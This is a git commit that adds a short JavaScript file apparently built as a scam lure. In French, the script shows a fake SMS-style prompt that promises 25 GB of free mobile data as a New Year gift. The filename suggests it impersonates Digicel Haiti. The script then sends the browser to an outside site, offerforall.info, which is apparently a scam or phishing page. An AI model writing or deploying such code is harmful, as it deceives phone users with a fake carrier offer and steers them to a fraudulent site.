2b771ea3acdb4263247be054bb891095e3fa0536
harryjohnson86 <mfonjohnson86@gmail.com>
2025-01-12 06:02:11 -0800

    Create haitidigicel-20go.js

---
+++ haitidigicel-20go.js
@@ -0,0 +1,5 @@
+var password = '25 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 25 Go de données gratuites. Cadeau bonus du Nouvel An, veuillez appuyer sur OK pour ACTIVER. ','25 Go de données gratuites');
+if (password != '25 Go de données gratuites') {
+location.href='https://offerforall.info/haitidigicel-20go.html';
+}
